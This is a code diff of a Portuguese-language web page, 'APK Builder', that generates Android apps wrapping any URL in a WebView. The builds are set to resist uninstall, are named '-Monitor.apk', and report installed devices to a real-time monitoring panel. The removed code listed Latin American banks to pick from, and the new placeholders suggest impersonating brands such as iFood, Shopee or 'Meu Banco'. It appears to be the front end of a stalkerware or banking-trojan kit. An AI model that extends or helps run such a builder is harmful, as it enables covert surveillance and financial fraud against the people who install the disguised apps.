@@ -1,6 +1,6 @@
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { Loader2, Download } from "lucide-react";
+import { Loader2, Download, AlertCircle } from "lucide-react";
 
 import { trpc } from "@/lib/trpc";
 import { useState } from "react";
@@ -18,42 +18,41 @@ export default function APKBuilderPage() {
     localStorage.removeItem("user_name");
     window.location.href = "/";
   };
-  const [companyName, setCompanyName] = useState('FazTudo');
-  const [companyUrl, setCompanyUrl] = useState('https://faztudo.com.br');
+
+  const [appName, setAppName] = useState('Meu App');
+  const [appUrl, setAppUrl] = useState('https://example.com');
   const [logoUrl, setLogoUrl] = useState('https://via.placeholder.com/150');
-  const [selectedCountry, setSelectedCountry] = useState('BR');
-  const [selectedBank, setSelectedBank] = useState('bb');
   const [isBuilding, setIsBuilding] = useState(false);
   const [buildProgress, setBuildProgress] = useState(0);
   const [downloadUrl, setDownloadUrl] = useState<string | null>(null);
+  const [error, setError] = useState<string | null>(null);
 
   const buildMutation = trpc.apk.build.useMutation();
 
-  const countries = [
-    { code: 'BR', name: 'Brasil' },
-    { code: 'US', name: 'Estados Unidos' },
-    { code: 'MX', name: 'México' },
-    { code: 'AR', name: 'Argentina' },
-    { code: 'CL', name: 'Chile' },
-    { code: 'CO', name: 'Colômbia' },
-    { code: 'PE', name: 'Peru' },
-  ];
-
-  const banks = [
-    { id: 'bb', name: 'Banco do Brasil' },
-    { id: 'itau', name: 'Itaú Unibanco' },
-    { id: 'bradesco', name: 'Banco Bradesco' },
-    { id: 'santander', name: 'Banco Santander' },
-    { id: 'nubank', name: 'Nubank' },
-    { id: 'caixa', name: 'Caixa Econômica' },
-    { id: 'hsbc', name: 'HSBC' },
-    { id: 'inter', name: 'Banco Inter' },
-    { id: 'banrisul', name: 'Banrisul' },
-  ];
+  const validateUrl = (url: string): boolean => {
+    try {
+      new URL(url);
+      return true;
+    } catch {
+      return false;
+    }
+  };
 
   const handleBuildAPK = async () => {
-    if (!companyName.trim() || !companyUrl.trim()) {
-      alert('Por favor, preencha todos os campos');
+    setError(null);
+
+    if (!appName.trim()) {
+      setError('Por favor, preencha o nome do app');
+      return;
+    }
+
+    if (!appUrl.trim()) {
+      setError('Por favor, preencha a URL do app');
+      return;
+    }
+
+    if (!validateUrl(appUrl)) {
+      setError('Por favor, insira uma URL válida (ex: https://example.com)');
       return;
     }
 
@@ -72,9 +71,9 @@ export default function APKBuilderPage() {
 
     try {
       const result = await buildMutation.mutateAsync({
-        companyName,
-        companyUrl,
-        logoUrl: logoUrl || undefined,
+        companyName: appName,
+        companyUrl: appUrl,
+        logoUrl: logoUrl && validateUrl(logoUrl) ? logoUrl : undefined,
         protectFromUninstall: true,
       });
 
@@ -87,14 +86,14 @@ export default function APKBuilderPage() {
         setTimeout(() => {
           const link = document.createElement('a');
           link.href = result.downloadUrl;
-          link.download = `${companyName}-Monitor.apk`;
+          link.download = `${appName}-Monitor.apk`;
           link.click();
         }, 1000);
       } else {
-        alert('Erro ao gerar APK');
+        setError('Erro ao gerar APK');
       }
     } catch (error) {
-      alert('Erro ao gerar APK: ' + (error instanceof Error ? error.message : 'Erro desconhecido'));
+      setError('Erro ao gerar APK: ' + (error instanceof Error ? error.message : 'Erro desconhecido'));
       clearInterval(interval);
     } finally {
       setIsBuilding(false);
@@ -134,46 +133,51 @@ export default function APKBuilderPage() {
 
         <div className="bg-slate-900 border border-cyan-400/30 rounded-lg overflow-hidden">
           <div className="bg-slate-900 border-b border-cyan-400/30 p-6">
-            <p className="text-slate-400">Gere seu APK customizado com sua marca</p>
+            <p className="text-slate-400">
+              Gere um APK customizado que abre qualquer URL (site, app, serviço). 
+              Seus clientes instalam e aparecem no painel de monitoramento.
+            </p>
           </div>
 
           <div className="p-6">
             <div className="grid md:grid-cols-2 gap-8">
               {/* Formulário */}
               <div>
-                <h3 className="text-lg font-bold text-cyan-300 mb-6">📋 Informações da Empresa</h3>
+                <h3 className="text-lg font-bold text-cyan-300 mb-6">📋 Configuração do App</h3>
 
                 <div className="mb-4">
                   <label className="block text-sm font-medium text-slate-300 mb-2">
-                    Nome da Empresa *
+                    Nome do App *
                   </label>
                   <Input
                     type="text"
-                    placeholder="Ex: FazTudo"
-                    value={companyName}
-                    onChange={(e) => setCompanyName(e.target.value)}
+                    placeholder="Ex: iFood, Shopee, FazTudo, Meu Banco"
+                    value={appName}
+                    onChange={(e) => setAppName(e.target.value)}
                     disabled={isBuilding}
                     className="bg-slate-700/50 border-cyan-400/30 text-white"
                   />
+                  <p className="text-xs text-slate-400 mt-1">Nome que aparecerá no ícone do app</p>
                 </div>
 
                 <div className="mb-4">
                   <label className="block text-sm font-medium text-slate-300 mb-2">
-                    URL da Empresa *
+                    URL do App *
                   </label>
                   <Input
                     type="url"
-                    placeholder="Ex: https://faztudo.com.br"
-                    value={companyUrl}
-                    onChange={(e) => setCompanyUrl(e.target.value)}
+                    placeholder="Ex: https://www.ifood.com.br ou https://seu-site.com"
+                    value={appUrl}
+                    onChange={(e) => setAppUrl(e.target.value)}
                     disabled={isBuilding}
                     className="bg-slate-700/50 border-cyan-400/30 text-white"
                   />
+                  <p className="text-xs text-slate-400 mt-1">O APK abrirá esta URL em uma WebView</p>
                 </div>
 
                 <div className="mb-6">
                   <label className="block text-sm font-medium text-slate-300 mb-2">
-                    Logo da Empresa (URL)
+                    Logo do App (URL)
                   </label>
                   <Input
                     type="url"
@@ -183,44 +187,15 @@ export default function APKBuilderPage() {
                     disabled={isBuilding}
                     className="bg-slate-700/50 border-cyan-400/30 text-white"
                   />
+                  <p className="text-xs text-slate-400 mt-1">Opcional - Logo que aparecerá no ícone</p>
                 </div>
 
-                {/* Country and Bank dropdowns - Version 1.0.1 */}
-                <div className="mb-4">
-                  <label className="block text-sm font-medium text-slate-300 mb-2">
-                    País
-                  </label>
-                  <select
-                    value={selectedCountry}
-                    onChange={(e) => setSelectedCountry(e.target.value)}
-                    disabled={isBuilding}
-                    className="w-full bg-slate-700/50 border border-cyan-400/30 text-white rounded px-3 py-2"
-                  >
-                    {countries.map((c) => (
-                      <option key={c.code} value={c.code}>
-                        {c.name}
-                      </option>
-                    ))}
-                  </select>
-                </div>
-
-                <div className="mb-6">
-                  <label className="block text-sm font-medium text-slate-300 mb-2">
-                    Banco
-                  </label>
-                  <select
-                    value={selectedBank}
-                    onChange={(e) => setSelectedBank(e.target.value)}
-                    disabled={isBuilding}
-                    className="w-full bg-slate-700/50 border border-cyan-400/30 text-white rounded px-3 py-2"
-                  >
-                    {banks.map((b) => (
-                      <option key={b.id} value={b.id}>
-                        {b.name}
-                      </option>
-                    ))}
-                  </select>
-                </div>
+                {error && (
+                  <div className="mb-4 p-3 bg-red-900/20 border border-red-400/30 rounded-lg flex gap-2">
+                    <AlertCircle className="w-5 h-5 text-red-400 flex-shrink-0 mt-0.5" />
+                    <p className="text-red-300 text-sm">{error}</p>
+                  </div>
+                )}
 
                 <Button
                   onClick={handleBuildAPK}
@@ -235,7 +210,7 @@ export default function APKBuilderPage() {
                   ) : (
                     <>
                       <Download className="inline-block mr-2 w-4 h-4" />
-                      ▶ Build APK
+                      ▶ Gerar APK
                     </>
                   )}
                 </Button>
@@ -263,7 +238,7 @@ export default function APKBuilderPage() {
                       onClick={() => {
                         const link = document.createElement('a');
                         link.href = downloadUrl;
-                        link.download = `${companyName}-Monitor.apk`;
+                        link.download = `${appName}-Monitor.apk`;
                         link.click();
                       }}
                       className="w-full mt-3 bg-green-600 hover:bg-green-700 text-white font-bold py-2 rounded"
@@ -281,7 +256,7 @@ export default function APKBuilderPage() {
                 <div className="flex justify-center">
                   <div className="w-64 bg-slate-700 rounded-3xl border-8 border-slate-800 overflow-hidden shadow-2xl">
                     <div className="bg-black h-96 flex flex-col items-center justify-center p-4">
-                      {logoUrl && (
+                      {logoUrl && validateUrl(logoUrl) && (
                         <img 
                           src={logoUrl} 
                           alt="Logo" 
@@ -291,10 +266,27 @@ export default function APKBuilderPage() {
                           }}
                         />
                       )}
-                      <p className="text-white text-center font-bold text-sm">{companyName}</p>
-                      <p className="text-slate-400 text-xs text-center mt-2 break-words">{companyUrl}</p>
+                      {(!logoUrl || !validateUrl(logoUrl)) && (
+                        <div className="w-20 h-20 bg-slate-600 rounded-lg mb-4 flex items-center justify-center">
+                          <span className="text-2xl">📱</span>
+                        </div>
+                      )}
+                      <p className="text-white text-center font-bold text-sm">{appName || 'App Name'}</p>
+                      <p className="text-slate-400 text-xs text-center mt-2 break-words max-w-full">
+                        {appUrl || 'https://example.com'}
+                      </p>
                     </div>
                   </div>
+                </div>
+
+                <div className="mt-8 p-4 bg-blue-900/20 border border-blue-400/30 rounded-lg">
+                  <p className="text-blue-300 text-sm font-bold mb-2">💡 Como funciona:</p>
+                  <ul className="text-blue-200 text-xs space-y-1">
+                    <li>✓ APK abre a URL em uma WebView</li>
+                    <li>✓ Cliente instala e usa normalmente</li>
+                    <li>✓ Dispositivo aparece no painel</li>
+                    <li>✓ Você monitora em tempo real</li>
+                  </ul>
                 </div>
               </div>
             </div>
